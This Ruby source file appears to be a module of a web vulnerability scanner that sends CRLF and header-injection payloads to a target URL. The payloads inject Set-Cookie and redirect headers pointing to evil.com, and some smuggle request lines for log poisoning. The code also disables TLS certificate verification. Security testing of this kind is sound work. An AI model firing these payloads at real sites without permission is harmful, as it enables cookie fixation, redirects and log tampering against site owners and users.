require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class CRLFInjection
  PAYLOADS = [
    '%0d%0aSet-Cookie: malicious=value',
    '%0d%0aLocation: http://evil.com',
    '%0d%0aX-Forwarded-For: 127.0.0.1',
    '%0d%0aX-Real-IP: 127.0.0.1',
    '%0d%0aX-Custom-Header: test',
    '%0aSet-Cookie: malicious=value',
    '%0aLocation: http://evil.com',
    '%0dSet-Cookie: malicious=value',
    '%0dLocation: http://evil.com',
    '\r\nSet-Cookie: malicious=value',
    '\r\nLocation: http://evil.com',
    '\nSet-Cookie: malicious=value',
    '\nLocation: http://evil.com',
    '\rSet-Cookie: malicious=value',
    '\rLocation: http://evil.com'
  ]

  def self.test_crlf_injection(url, parameter = 'input')
    results = []
    
    PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response
          headers = response.to_hash
          
          if headers['Set-Cookie']&.any? { |c| c.include?('malicious') } ||
             headers['Location']&.any? { |l| l.include?('evil.com') } ||
             headers['X-Custom-Header']&.any? { |h| h.include?('test') }
            puts Colorize.red("CRLF injection found!")
            puts Colorize.yellow("Payload: #{payload}")
            results << { payload: payload, vulnerable: true, headers: headers }
          end
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_header_injection(url, header_name, header_value)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      req = Net::HTTP::Get.new(uri.path)
      req[header_name] = header_value + "\r\nX-Injected: test"
      
      res = http.request(req)
      
      if res['X-Injected']
        puts Colorize.red("Header injection possible")
        return { vulnerable: true }
      end
    rescue => e
    end
    
    { vulnerable: false }
  end

  def self.test_log_poisoning(url, parameter = 'user')
    payloads = [
      "#{parameter}=admin%0d%0aGET /admin HTTP/1.1",
      "#{parameter}=admin%0aGET /admin HTTP/1.1",
      "#{parameter}=admin%0dGET /admin HTTP/1.1"
    ]
    
    results = []
    
    payloads.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{payload}" : "#{url}?#{payload}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i == 200
          puts Colorize.yellow("Log poisoning test: #{payload}")
          results << { payload: payload, tested: true }
        end
      rescue => e
      end
    end
    
    results
  end
end

